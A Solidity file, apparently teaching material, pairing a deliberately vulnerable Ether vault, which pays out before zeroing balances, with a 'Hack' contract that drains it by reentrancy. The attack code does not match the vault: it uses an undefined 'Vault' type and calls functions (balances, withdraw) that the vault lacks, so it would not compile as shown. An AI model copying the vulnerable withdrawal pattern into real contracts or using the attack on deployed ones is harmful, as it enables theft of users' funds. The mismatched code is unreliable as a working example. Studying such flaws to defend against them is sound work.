// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

error e__InsufficientBalance();

// This contract is an example for an insecured wallet contract. 
// This can easily be attacked and drain all the money stored inside the contract.
// Best solution is to extend the contract using @Openzepplin/ReentrancyGuard 
contract C_02_InsecureEtherVault {
    mapping(address => uint256) private userBalances;

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdrawAll() external {
        // if (userBalances[msg.sender] <= 0) revert e__InsufficientBalance();
        require(userBalances[msg.sender] > 0, "Insufficient Balance");
        (bool success, ) = msg.sender.call{value: userBalances[msg.sender]}("");
        require(success, "Failed to send Ether");

        userBalances[msg.sender ] = 0;
    }

    function getTotalBalance() external view returns(uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return userBalances[_user];
    }

}

contract Hack {

    Vault public immutable vault;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function deposit() external payable {
        // call .deposit to deposit to the vault
        vault.deposit{value: msg.value}();
    }
    
    function attack() external {
        // @notice .call interaction with empty data will invoke the receice() function @45 => trigger the draning logic
        uint amount = vault.balances(address(this));
        vault.withdraw(amount);
    }

    receive() external payable{
        // @notice as in the `.call` interaction in `C_02_InsecureEtherVault.widthdraw()` happens before updating the state
        // => this condition down bellow is always true
        if (address(vault).balance >= msg.value) {
            vault.withdraw(msg.value);
        } else {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
}
